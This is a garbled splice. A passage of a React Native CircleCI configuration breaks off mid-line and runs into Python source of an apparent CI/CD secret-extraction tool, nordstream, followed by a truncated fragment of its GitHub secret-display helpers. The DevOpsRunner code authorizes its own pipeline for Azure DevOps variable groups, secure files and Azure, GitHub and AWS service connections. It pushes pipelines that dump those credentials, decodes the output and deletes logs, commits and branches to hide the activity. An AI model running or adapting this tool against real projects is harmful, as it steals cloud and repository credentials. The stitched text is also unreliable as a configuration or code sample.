            - run: echo "Failing tests may be moved here temporarily."
            - run_e2e:
                platform: android
      # -------------------------

      # Collect Results
      - report_bundle_size:
          platform: android
      - run:
          name: Collect Test Results
          command: |
            find . -type f -regex ".*/build/test-results/debug/.*xml" -exec cp {} ./reports/build/ \;
            find . -type f -regex ".*/outputs/androidTest-results/connected/.*xml" -exec cp {} ./reports/outputs/ \;
            find . -type f -regex ".*/buck-out/gen/ReactAndroid/src/test/.*/.*xml" -exec cp {} ./reports/buck/ \;
            if [ -f ~/react-native/reports/buck/all-results-raw.xml ]; then
              cd ~/okbuck
              ./tooling/junit/buck_to_junit.sh ~/react-native/reports/buck/all-results-raw.xml ~/react-native/reports/junit/results.xml
            fi
          when: always
      - store_test_results:
          path: ./reports/junit

  # -------------------------
  #    JOBS: Test Docker
  # -------------------------
  test_docker:
    machine: true
    steps:
      - checkout
      - run:
          name: Build Docker container for Android RNTester App
          command: |
            source ~/.bashrc
            nvm i node
            npm i -g yarn
            echo y | npx envinfo@latest
            yarn run docker-setup-android
            yarn run docker-build-android

  # -------------------------
  #    JOBS: Windows
  # -------------------------
  test_windows:
    executor:
      name: win/default
    parameters:
      run_disabled_tests:
        type: boolean
        default: false
    environment:
      - ANDROID_HOME: "C:\\Android\\android-sdk"
      - ANDROID_NDK: "C:\\Android\\android-sdk\\ndk\\20.1.5948944"
      - ANDROID_BUILD_VERSION: 30
      - ANDROID_TOOLS_VERSION: 29.0.3
      - GRADLE_OPTS: -Dorg.gradle.daemon=false
      - NDK_VERSION: 20.1.5948944
    steps:
      - checkout

      # Setup Dependencies
      - run:
          name: Install Yarn
          command: choco install yarn

      - run:
          name: Display Environment info
          command: npx envinfo@latest

      - restore_cache:
          keys:
            - v1-win-yarn-cache-{{ arch }}-{{ checksum "yarn.lock" }}
      - run:
          name: "Yarn: Install Dependencies"
          command: yarn install --frozen-lockfile --non-interactive
      - save_cache:
          key: v1-win-yarn-cache-{{ arch }}-{{ checksum "yarn.lock" }}
          paths:
            - C:\Users\circleci\AppData\Local\Yarn

      # Try to install the SDK up to 3 times, since network flakiness can cause install failures
      # Using a timeout of 9 mins, as circle ci will timeout if there is no output for 10 mins
      - run:
          name: Install Android SDK Tools
          command: choco install android-sdk --timeout 540; if (!$?) { choco install android-sdk --timeout 540 --force --forcedependencies}; if (!$?) { choco install android-sdk  --force --forcedependencies}

      - run:
          name: Setup Android SDKs
          command: |
            sdkmanager --licenses
            sdkmanager "system-images;android-21;google_apis;armeabi-v7a"
            sdkmanager "platforms;android-%ANDROID_BUILD_VERSION%"
            sdkmanager "build-tools;%ANDROID_TOOLS_VERSION%"
            sdkmanager "add-ons;addon-google_apis-google-23"
            sdkmanager "extras;android;m2repository"
            sdkmanager "ndk;%NDK_VERSION%"

      # -------------------------
      # Run Tests
      - run:
          name: "Flow: Check Android"
          command: yarn flow-check-android
      - run:
          name: "Flow: Check iOS"
          command: yarn flow-check-ios
      - run:
          name: "Run Tests: JavaScript Tests"
          command: yarn test

      # Optionally, run disabled tests
      - when:
          condition: << parameters.run_disabled_tests >>
          steps:
            - run: echo "Failing tests may be moved here temporarily."
            - run:
                name: Android Build
                command: ./gradlew.bat packages:rn-tester:android:app:assembleRelease

  # -------------------------
  #      JOBS: Coverage
  # -------------------------
  # Collect JavaScript test coverage
  js_coverage:
    executor: nodelts
    environment:
      - CI_BRANCH: $CIRCLE_BRANCH
      - CI_PULL_REQUEST: $CIRCLE_PULL_REQUEST
      - CI_BUILD_NUMBER: $CIRCLE_BUILD_NUM
      - CI_BUILD_URL: $CIRCLE_BUILD_URL
    steps:
      - restore_cache_checkout:
          checkout_type: node
      - setup_artifacts
      - run_yarn
      - run:
          name: Collect test coverage information
          command: |
            scripts/circleci/exec_swallow_error.sh yarn test --coverage --maxWorkers=2
            if [[ -e ./coverage/lcov.info ]]; then
              cat ./coverage/lcov.info | scripts/circleci/exec_swallow_error.sh ./node_modules/.bin/coveralls
            fi
      - store_artifacts:
          path: ~/react-native/coverage/

  # -------------------------
  #      JOBS: Releases
  # -------------------------
  # Publishes a new version onto npm
  publish_npm_package:
    parameters:
      publish_npm_args:
        type: string
        default: --nonightly
    executor: reactnativeandroid
    steps:
      - run:
          name: Add github.com to SSH known hosts
          command: |
            mkdir -p ~/.ssh
            echo '|1|If6MU203eXTaaWL678YEfWkVMrw=|kqLeIAyTy8pzpj8x8Ae4Fr8Mtlc= ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAq2A7hRGmdnm9tUDbO9IDSwBK6TbQa+PXYPCPy6rbTrTtw7PHkccKrpp0yVhp5HdEIcKr6pLlVDBfOLX9QUsyCOV0wzfjIJNlGEYsdlLJizHhbn2mUjvSAHQqZETYP81eFzLQNnPHt4EVVUh7VfDESU84KezmD5QlWpXLmvU31/yMf+Se8xhHTvKSCZIFImWwoG6mbUoWf9nzpIoaSjB+weqqUUmpaaasXVal72J+UX2B+2RPW3RcT0eOzQgqlJL3RKrTJvdsjE3JEAvGq3lGHSZXy28G3skua2SmVi/w4yCE6gbODqnTWlg7+wC604ydGXA8VJiS5ap43JXiUFFAaQ==' >> ~/.ssh/known_hosts
      - restore_cache_checkout:
          checkout_type: android
      - run_yarn
      - install_buck_tooling
      - download_buck_dependencies
      - download_gradle_dependencies
      - run: echo "//registry.npmjs.org/:_authToken=${CIRCLE_NPM_TOKEN}" > ~/.npmrc
      - run: |
          git config --global user.email "react-native-bot@users.noreply.github.com"
          git config --global user.name "npm Deployment Script"
          echo "machine github.com login react-native-bot password $GITHUB_TOKEN" > ~/.netrc
      - run: node ./scripts/publish-npm.js << parameters.publish_npm_args >>

  # -------------------------
  #    JOBS: Nightly
  # -------------------------
  nightly_job:
    machine: true
    steps:
      - run:
          name: Nightly
          command: |
            echo "Nightly build run"

# -------------------------
#        WORK FLOWS
# -------------------------
workflows:
  version: 2

  tests:
    jobs:
      - setup:
          name: setup_js
          filters:
            branches:
              ignore: gh-pages
      - setup:
          name: setup_ios
          checkout_type: ios
          executor: reactnativeios
          filters:
            branches:
              ignore: gh-pages
      - setup:
          name: setup_android
          checkout_type: android
          executor: reactnativeandroid
          filters:
            branches:
              ignore: gh-pages
      - test_js:
          run_disabled_tests: false
          requires:
            - setup_js
      - test_android:
          run_disabled_tests: false
          requires:
            - setup_android
      - test_ios:
          name: test_ios_unit_jsc
          run_unit_tests: true
          requires:
            - setup_ios
      # DISABLED: USE_FRAMEWORKS=1 not supported by Flipper
      # - test_ios:
      #     name: test_ios_unit_frameworks_jsc
      #     use_frameworks: true
      #     run_unit_tests: true
      #     requires:
      #       - setup_ios
      - test_ios:
          name: test_ios_unit_hermes
          use_hermes: true
          run_unit_tests: true
          requires:
            - setup_ios
      # DISABLED: USE_FRAMEWORKS=1 not supported by Flipper
      # - test_ios:
      #     name: test_ios_unit_frameworks_hermes
      #     use_hermes: true
      #     use_frameworks: true
      #     run_unit_tests: true
      #     requires:
      #       - setup_ios
      # DISABLED: Detox tests need to be fixed
      # - test_ios:
      #     name: test_ios_detox
      #     run_detox_tests: true
      #     requires:
      #       - setup_ios
      # DISABLED: USE_FRAMEWORKS=1 not supported by Flipper
      # - test_ios:
      #     name: test_ios_detox_frameworks
      #     use_frameworks: true
      #     run_detox_tests: true
      #     requires:
      #       - setup_ios
      - test_js:
          name: test_js_prev_lts
          executor: nodeprevlts
          requires:
            - setup_js
      - test_docker:
          filters:
            branches:
              ignore: gh-pages
      - test_windows:
          filters:
            branches:
              ignore: gh-pages
          run_disabled_tests: false

  releases:
    jobs:
      - setup:
          name: setup_android
          checkout_type: android
          executor: reactnativeandroid
          filters:
            # Both of the following conditions must be included!
            # Ignore any commit on any branch by default.
            branches:
              ignore: /.*/
            # Only act on version tags.
            tags:
              only: /v[0-9]+(\.[0-9]+)*(\-rc(\.[0-9]+)?)?/
      - publish_npm_package:
          requires:
            - setup_android
          filters:
            # Both of the following conditions must be included!
            # Ignore any commit on any branch by default.
            branches:
              ignore: /.*/
            # Only act on version tags.
            tags:
              only: /v[0-9]+(\.[0-9]+)*(\-rc(\.[0-9]+)?)?/

  analysis:
    jobs:
      - setup:
          name: setup_js

      - setup:
          name: setup_android
          checkout_type: android
          executor: reactnativeandroid

      # Run lints on every commit other than those to the gh-pages branch
      - analyze_code:
          requires:
            - setup_android
          filters:
            branches:
              ignore: gh-pages

      # Run code checks on PRs from forks
      - analyze_pr:
          requires:
            - setup_android
          filters:
            branches:
              only: /^pull\/.*$/

      # Gather coverage
      - js_coverage:
          requires:
            - setup_js
  nightly:
    triggers:
      - schedule:
          cron: "0 0 * * *"
          filters:
            branches:
              only:
                - master
    jobs:
      - nightly_job

      - setup:
          name: setup_android
          checkout_type: android
          executor: reactnativeandroid

      - publish_npm_package:
          publish_npm_args: --nightly
          requires:
            - setup_android }}/build'

permissions: import logging
import base64
import time

from os import makedirs, chdir
from os.path import exists, realpath
from nordstream.yaml.devops import DevOpsPipelineGenerator
from nordstream.utils.errors import GitError, RepoCreationError, DevOpsError
from nordstream.utils.log import logger
from nordstream.git import Git
import subprocess


class DevOpsRunner:
    _cicd = None
    _extractVariableGroups = True
    _extractSecureFiles = True
    _extractAzureServiceconnections = True
    _extractGitHubServiceconnections = True
    _extractAWSServiceconnections = True
    _yaml = None
    _writeAccessFilter = False
    _pipelineFilename = "azure-pipelines.yml"
    _output = None
    _cleanLogs = True
    _resType = {"default": 0, "doubleb64": 1, "github": 2, "azurerm": 3}
    _pushedCommitsCount = 0
    _branchAlreadyExists = False
    _allowedTypes = ["azurerm", "github", "aws"]

    def __init__(self, cicd):
        self._cicd = cicd
        self.__createLogDir()

    @property
    def extractVariableGroups(self):
        return self._extractVariableGroups

    @extractVariableGroups.setter
    def extractVariableGroups(self, value):
        self._extractVariableGroups = value

    @property
    def extractSecureFiles(self):
        return self._extractSecureFiles

    @extractSecureFiles.setter
    def extractSecureFiles(self, value):
        self._extractSecureFiles = value

    @property
    def extractAzureServiceconnections(self):
        return self._extractAzureServiceconnections

    @extractAzureServiceconnections.setter
    def extractAzureServiceconnections(self, value):
        self._extractAzureServiceconnections = value

    @property
    def extractGitHubServiceconnections(self):
        return self._extractGitHubServiceconnections

    @extractGitHubServiceconnections.setter
    def extractGitHubServiceconnections(self, value):
        self._extractGitHubServiceconnections = value

    @property
    def extractAWSServiceconnections(self):
        return self._extractAWSServiceconnections

    @extractAWSServiceconnections.setter
    def extractAWSServiceconnections(self, value):
        self._extractAWSServiceconnections = value

    @property
    def output(self):
        return self._output

    @output.setter
    def output(self, value):
        self._output = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    @property
    def writeAccessFilter(self):
        return self._writeAccessFilter

    @writeAccessFilter.setter
    def writeAccessFilter(self, value):
        self._writeAccessFilter = value

    def __createLogDir(self):
        self._cicd.outputDir = realpath(self._cicd.outputDir) + "/azure_devops"
        makedirs(self._cicd.outputDir, exist_ok=True)

    def listDevOpsProjects(self):
        logger.info("Listing all projects:")
        for p in self._cicd.projects:
            name = p.get("name")
            logger.raw(f"- {name}\n", level=logging.INFO)

    def getProjects(self, project):
        if project:
            if exists(project):
                with open(project, "r") as file:
                    for project in file:
                        self._cicd.addProject(project.strip())

            else:
                self._cicd.addProject(project)
        else:
            self._cicd.listProjects()

        if self._writeAccessFilter:
            self._cicd.filterWriteProjects()

        if len(self._cicd.projects) == 0:
            if self._writeAccessFilter:
                logger.critical("No project with write access found.")
            else:
                logger.critical("No project found.")

    def listProjectSecrets(self):
        logger.info("Listing secrets")
        for project in self._cicd.projects:
            projectName = project.get("name")
            projectId = project.get("id")
            logger.info(f'"{projectName}" secrets')
            self.__displayProjectVariableGroupsSecrets(projectId)
            self.__displayProjectSecureFiles(projectId)
            self.__displayServiceConnections(projectId)
            logger.empty_line()

    def __displayProjectVariableGroupsSecrets(self, project):

        try:
            secrets = self._cicd.listProjectVariableGroupsSecrets(project)
        except DevOpsError as e:
            logger.error(e)

        else:
            if len(secrets) != 0:
                for variableGroup in secrets:
                    logger.info(f"Variable group: \"{variableGroup.get('name')}\"")
                    for sec in variableGroup.get("variables"):
                        logger.raw(f"\t- {sec}\n", logging.INFO)

    def __displayProjectSecureFiles(self, project):

        try:
            secureFiles = self._cicd.listProjectSecureFiles(project)
        except DevOpsError as e:
            logger.error(e)
        else:
            if secureFiles:
                for sf in secureFiles:
                    logger.info(f'Secure file: "{sf["name"]}"')

    def __displayServiceConnections(self, projectId):

        try:
            serviceConnections = self._cicd.listServiceConnections(projectId)
        except DevOpsError as e:
            logger.error(e)
        else:
            if len(serviceConnections) != 0:
                logger.info("Service connections:")
                for sc in serviceConnections:
                    scType = sc.get("type")
                    scName = sc.get("name")
                    logger.raw(f"\t- {scName} ({scType})\n", logging.INFO)

    def __checkSecrets(self, project):
        projectId = project.get("id")
        projectName = project.get("name")
        secrets = 0

        if (
            self._extractAzureServiceconnections
            or self._extractGitHubServiceconnections
            or self._extractAWSServiceconnections
        ):

            try:
                secrets += len(self._cicd.listServiceConnections(projectId))
            except DevOpsError as e:
                logger.error(f"Error while listing service connection: {e}")

        if self._extractVariableGroups:

            try:
                secrets += len(self._cicd.listProjectVariableGroupsSecrets(projectId))
            except DevOpsError as e:
                logger.error(f"Error while listing variable groups: {e}")

        if self._extractSecureFiles:

            try:
                secrets += len(self._cicd.listProjectSecureFiles(projectId))
            except DevOpsError as e:
                logger.error(f"Error while listing secure files: {e}")

        if secrets == 0:
            logger.info(f'No secrets found for project "{projectName}" / "{projectId}"')
            return False
        return True

    def createYaml(self, pipelineType):
        pipelineGenerator = DevOpsPipelineGenerator()
        if pipelineType == "github":
            pipelineGenerator.generatePipelineForGitHub("#FIXME")
        elif pipelineType == "azurerm":
            pipelineGenerator.generatePipelineForAzureRm("#FIXME")
        elif pipelineType == "aws":
            pipelineGenerator.generatePipelineForAWS("#FIXME")
        else:
            pipelineGenerator.generatePipelineForSecretExtraction({"name": "", "variables": ""})

        logger.success("YAML file: ")
        pipelineGenerator.displayYaml()
        pipelineGenerator.writeFile(self._output)

    def __extractPipelineOutput(self, projectId, resType=0, resultsFilename="secrets.txt"):
        with open(
            f"{self._cicd.outputDir}/{self._cicd.org}/{projectId}/{self._fileName}",
            "rb",
        ) as output:
            try:
                if resType == self._resType["doubleb64"]:
                    pipelineResults = self.__doubleb64(output)
                elif resType == self._resType["github"]:
                    pipelineResults = self.__extractGitHubResults(output)
                elif resType == self._resType["azurerm"]:
                    pipelineResults = self.__azureRm(output)
                elif resType == self._resType["default"]:
                    pipelineResults = output.read()
                else:
                    logger.exception("Invalid type checkout: _resType")
            except:
                output.seek(0)
                pipelineResults = output.read()

        logger.success("Output:")
        logger.raw(pipelineResults, logging.INFO)

        with open(f"{self._cicd.outputDir}/{self._cicd.org}/{projectId}/{resultsFilename}", "ab") as file:
            file.write(pipelineResults)

    @staticmethod
    def __extractGitHubResults(output):
        decoded = DevOpsRunner.__doubleb64(output)
        for line in decoded.split(b"\n"):
            if b"AUTHORIZATION" in line:
                try:
                    return base64.b64decode(line.split(b" ")[-1]) + b"\n"
                except Exception as e:
                    logger.error(e)
        return None

    @staticmethod
    def __doubleb64(output):
        # well it's working
        data = output.readlines()[-3].split(b" ")[1]
        return base64.b64decode(base64.b64decode(data))

    @staticmethod
    def __azureRm(output):
        # well it's working
        data = output.readlines()[-3].split(b" ")[1]
        return base64.b64decode(base64.b64decode(data))

    def __launchPipeline(self, project, pipelineId, pipelineGenerator):
        logger.verbose(f"Launching pipeline.")

        pipelineGenerator.writeFile(f"./{self._pipelineFilename}")
        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if b"Everything up-to-date" in pushOutput.communicate()[1].strip():
                logger.error("Error when pushing code: Everything up-to-date")
                logger.warning(
                    "Your trying to push the same code on an existing branch, modify the yaml file to push it."
                )

            elif pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)

            else:
                self._pushedCommitsCount += 1
                logger.raw(pushOutput.communicate()[1])

                # manual trigger because otherwise is difficult to get the right runId
                run = self._cicd.runPipeline(project, pipelineId)

                self.__checkRunErrors(run)

                runId = run.get("id")
                pipelineStatus = self._cicd.waitPipeline(project, pipelineId, runId)

                if pipelineStatus == "succeeded":
                    logger.success("Pipeline has successfully terminated.")
                    return runId

                elif pipelineStatus == "failed":
                    self.__displayFailureReasons(project, runId)
                    return None

        except Exception as e:
            logger.error(e)
        finally:
            pass

    def __displayFailureReasons(self, projectId, runId):
        logger.error("Workflow failure:")
        for reason in self._cicd.getFailureReason(projectId, runId):
            logger.error(f"{reason}")

    def __extractVariableGroupsSecrets(self, projectId, pipelineId):
        logger.verbose(f"Getting variable groups secrets")

        try:
            variableGroups = self._cicd.listProjectVariableGroupsSecrets(projectId)
        except DevOpsError as e:
            logger.error(e)

        else:
            if len(variableGroups) > 0:
                for variableGroup in variableGroups:
                    pipelineGenerator = DevOpsPipelineGenerator()
                    pipelineGenerator.generatePipelineForSecretExtraction(variableGroup)

                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for variable group: "{variableGroup["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(
                        projectId, pipelineId, variableGroup, "variablegroup"
                    ):
                        continue

                    variableGroupName = variableGroup.get("name")

                    logger.info(f'Extracting secrets for variable group: "{variableGroupName}"')
                    runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
                    if runId:
                        self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                        if self._fileName:
                            self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

                        logger.empty_line()

            else:
                logger.info("No variable groups found")

    def __extractSecureFiles(self, projectId, pipelineId):
        logger.verbose(f"Getting secure files")

        try:
            secureFiles = self._cicd.listProjectSecureFiles(projectId)
        except DevOpsError as e:
            logger.error(e)

        else:
            if secureFiles:
                for secureFile in secureFiles:
                    pipelineGenerator = DevOpsPipelineGenerator()
                    pipelineGenerator.generatePipelineForSecureFileExtraction(secureFile["name"])

                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for the secure file: "{secureFile["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(
                        projectId, pipelineId, secureFile, "securefile"
                    ):
                        continue

                    logger.info(f'Extracting secure file: "{secureFile["name"]}"')
                    runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
                    if runId:
                        self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                        if self._fileName:
                            date = time.strftime("%Y-%m-%d_%H-%M-%S")
                            safeSecureFilename = "".join(
                                [c for c in secureFile["name"] if c.isalpha() or c.isdigit() or c in (" ", ".")]
                            ).strip()
                            self.__extractPipelineOutput(
                                projectId,
                                self._resType["doubleb64"],
                                f"pipeline_{date}_secure_file_{safeSecureFilename}",
                            )

                        logger.empty_line()
            else:
                logger.info("No secure files found")

    def __extractGitHubSecrets(self, projectId, pipelineId, sc):
        endpoint = sc.get("name")

        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.generatePipelineForGitHub(endpoint)

        logger.info(f'Extracting secrets for GitHub: "{endpoint}"')
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId, self._resType["github"])

        logger.empty_line()

    def __extractAzureRMSecrets(self, projectId, pipelineId, sc):

        scheme = sc.get("authorization").get("scheme").lower()
        if scheme == "serviceprincipal":
            name = sc.get("name")
            pipelineGenerator = DevOpsPipelineGenerator()
            pipelineGenerator.generatePipelineForAzureRm(name)

            logger.info(f'Extracting secrets for AzureRM: "{name}"')
            runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
            if runId:
                self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                if self._fileName:
                    self.__extractPipelineOutput(projectId, self._resType["azurerm"])

                logger.empty_line()
        else:
            logger.error(f"Unsupported scheme: {scheme}")

    def __extractAWSSecrets(self, projectId, pipelineId, sc):

        scheme = sc.get("authorization").get("scheme").lower()
        if scheme == "usernamepassword":

            name = sc.get("name")

            pipelineGenerator = DevOpsPipelineGenerator()
            pipelineGenerator.generatePipelineForAWS(name)

            logger.info(f'Extracting secrets for AWS: "{name}"')
            runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
            if runId:
                self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                if self._fileName:
                    self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

                logger.empty_line()
        else:
            logger.error(f"Unsupported scheme: {scheme}")

    def __extractServiceConnectionsSecrets(self, projectId, pipelineId):

        try:
            serviceConnections = self._cicd.listServiceConnections(projectId)
        except DevOpsError as e:
            logger.error(e)
        else:
            for sc in serviceConnections:

                scType = sc.get("type").lower()

                if scType in self._allowedTypes:
                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for the service connection: "{sc["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(projectId, pipelineId, sc, "endpoint"):
                        continue

                    if self._extractAzureServiceconnections and scType == "azurerm":
                        self.__extractAzureRMSecrets(projectId, pipelineId, sc)
                    elif self._extractGitHubServiceconnections and scType == "github":
                        self.__extractGitHubSecrets(projectId, pipelineId, sc)
                    elif self._extractAWSServiceconnections and scType == "aws":
                        self.__extractAWSSecrets(projectId, pipelineId, sc)

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for project in self._cicd.projects:
            projectId = project.get("id")
            logger.info(f"Cleaning logs for project: {projectId}")
            self._cicd.cleanAllLogs(projectId)

    def __runSecretsExtractionPipeline(self, projectId, pipelineId):
        if self._extractVariableGroups:
            self.__extractVariableGroupsSecrets(projectId, pipelineId)

        if self._extractSecureFiles:
            self.__extractSecureFiles(projectId, pipelineId)

        if (
            self._extractAzureServiceconnections
            or self._extractGitHubServiceconnections
            or self._extractAWSServiceconnections
        ):
            self.__extractServiceConnectionsSecrets(projectId, pipelineId)

    def __pushEmptyFile(self):
        Git.gitCreateEmptyFile("README.md")

        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)
            else:
                logger.raw(pushOutput.communicate()[1])

        except Exception as e:
            logger.exception(e)

    def __createRemoteRepo(self, projectId):
        repo = self._cicd.createGit(projectId)
        if repo.get("id"):
            repoId = repo.get("id")
            logger.info(f'New remote repository created: "{self._cicd.repoName}" / "{repoId}"')
            return repo
        else:
            return None

    def __getRemoteRepo(self, projectId):
        for repo in self._cicd.listRepositories(projectId):
            if self._cicd.repoName == repo.get("name"):
                return repo, False

        repo = self.__createRemoteRepo(projectId)
        if repo != None:
            return repo, True

        raise RepoCreationError("No repo found")

    def __deleteRemoteBranch(self):
        logger.verbose("Deleting remote branch")
        deleteOutput = Git.gitDeleteRemote(self._cicd.branchName)
        deleteOutput.wait()

        if deleteOutput.returncode != 0:
            logger.error(f"Error deleting remote branch {self._cicd.branchName}")
            logger.raw(deleteOutput.communicate()[1], logging.INFO)
            return False
        return True

    def __clean(self, projectId, repoId, deleteRemoteRepo, deleteRemotePipeline):
        if self._cleanLogs:
            if deleteRemotePipeline:
                logger.verbose("Deleting remote pipeline.")
                self._cicd.deletePipeline(projectId)

        if deleteRemoteRepo:
            logger.verbose("Deleting remote repository.")
            self._cicd.deleteGit(projectId, repoId)

        else:
            if self._pushedCommitsCount > 0:

                if self._cleanLogs:
                    logger.info(f"Cleaning logs for project: {projectId}")
                    self._cicd.cleanAllLogs(projectId)

                logger.verbose("Cleaning commits.")
                if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
                    Git.gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
                else:
                    if not self.__deleteRemoteBranch():
                        logger.info("Cleaning remote branch.")
                        # rm everything if we can't delete the branch (only leave one file otherwise it will try to rm the branch)
                        Git.gitCleanRemote(self._cicd.branchName, leaveOneFile=True)

    def __createPipeline(self, projectId, repoId):
        logger.info("Getting pipeline")
        self.__pushEmptyFile()

        for pipeline in self._cicd.listPipelines(projectId):
            if pipeline.get("name") == self._cicd.pipelineName:
                return pipeline.get("id"), False

        pipelineId = self._cicd.createPipeline(projectId, repoId, f"{self._pipelineFilename}")
        if pipelineId:
            return pipelineId, True
        else:
            raise Exception("unable to create a pipeline")

    def __runCustomPipeline(self, projectId, pipelineId):
        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.loadFile(self._yaml)

        logger.info("Running arbitrary pipeline")
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId)

            logger.empty_line()

    def runPipeline(self):
        for project in self._cicd.projects:
            projectId = project.get("id")
            repoId = None
            deleteRemoteRepo = False
            deleteRemotePipeline = False

            # skip if no secrets
            if not self._yaml:
                if not self.__checkSecrets(project):
                    continue

            try:
                # Create or get first repo of the project
                repo, deleteRemoteRepo = self.__getRemoteRepo(projectId)
                repoId = repo.get("id")
                self._cicd.repoName = repo.get("name")
                logger.info(f'Getting remote repository: "{self._cicd.repoName}" /' f' "{repoId}"')

                url = f"https://foo:{self._cicd.token}@dev.azure.com/{self._cicd.org}/{projectId}/_git/{self._cicd.repoName}"

                if not Git.gitClone(url):
                    raise GitError("Fail to clone the repository")

                chdir(self._cicd.repoName)

                self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
                Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

                pipelineId, deleteRemotePipeline = self.__createPipeline(projectId, repoId)

                if self._yaml:
                    self.__runCustomPipeline(projectId, pipelineId)
                else:
                    self.__runSecretsExtractionPipeline(projectId, pipelineId)

            except (GitError, RepoCreationError) as e:
                name = project.get("name")
                logger.error(f"Error in project {name}: {e}")

            except KeyboardInterrupt:
                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

            except Exception as e:
                logger.error(f"Error during pipeline run: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

            else:
                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

    def describeToken(self):
        response = self._cicd.getUser()
        logger.info("Token information:")

        username = response.get("authenticatedUser").get("properties").get("Account").get("$value")
        if username != "":
            logger.raw(f"\t- Username: {username}\n", logging.INFO)

        id = response.get("authenticatedUser").get("id")
        if id != "":
            logger.raw(f"\t- Id: {id}\n", logging.INFO)

    def __checkRunErrors(self, run):
        if run.get("customProperties") != None:
            validationResults = run.get("customProperties").get("ValidationResults", [])

            msg = ""
            for res in validationResults:
                if res.get("result", "") == "error":

                    if "Verify the name and credentials being used" in res.get("message", ""):
                        raise DevOpsError("The stored token is not valid anymore.")

                    msg += res.get("message", "") + "\n"

            raise DevOpsError(msg)
  contents: from nordstream.utils.log import logger
import logging
from nordstream.core.github.protections import getUsersArray, getTeamsOrAppsArray


def displayRepoSecrets(secrets):
    if len(secrets) != 0:
        logger.info("Repo secrets:")
        for secret in secrets:
            logger.raw(f"\t- {secret}\n", logging.INFO)


def displayEnvSecrets(env, secrets):
    if len(secrets) != 0:
        logger.info(f"{env} secrets:")
        for secret in secrets:
            logger.raw(f"\t- {secret}\n", logging.INFO)


def displayOrgSecrets(secrets):
    if len(secrets) != 0:
        logger.info("Repository organization secrets:")
        for secret in secrets:
            logger.raw(f"\t- {secret}\n", logging.INFO)


def displayEnvSecurity(envDetails):
    protectionRules = envDetails.get("protection_rules")
    envName = envDetails.get("name")

    if len(protectionRules) > 0:
        logger.info(f'Environment protection for: "{envName}":')
        for protection in protectionRules:
            if protection.get("type") == "required_reviewers":
                for reviewer in protection.get("reviewers"):
                    reviewerType = reviewer.get("type")
                    login = reviewer.get("reviewer").get("login")
                    userId = reviewer.get("reviewer").get("id")
                    logger.raw(
                        f"\t- reviewer ({reviewerType}): {login}/{userId}\n",
                        logging.INFO,
                    )
            elif protection.get("type") == "wait_timer":
                wait = protection.get("wait_timer")
                logger.raw(f"\t- timer: {wait} min\n", logging.INFO)
            else:
                branchPolicy = envDetails.get("deployment_branch_policy")
                if branchPolicy.get("custom_branch_policies", False):
                    logger.raw(f"\t- deployment branch policy: custom\n", logging.INFO)
                else:
                    logger.raw(f"\t- deployment branch policy: protected\n", logging.INFO)
    else:
        logger.info(f'No environment protection rule found for: "{envName}"')


def displayBranchProtectionRules(protections):
    logger.info("Branch protections:")

    logger.raw(
        f'\t- enforce admins: {protections.get("enforce_admins").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- block creations:" f' {protections.get("block_creations").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- required signatures:" f' {protections.get("required_signatures").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- allow force pushes:" f' {protections.get("allow_force_pushes").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- allow deletions:" f' {protections.get("allow_deletions").get("enabled")}\n',
        logging.INFO,
    )

    if protections.get("restrictions"):
        displayRestrictions(protections.get("restrictions"))

    if protections.get("required_pull_request_reviews"):
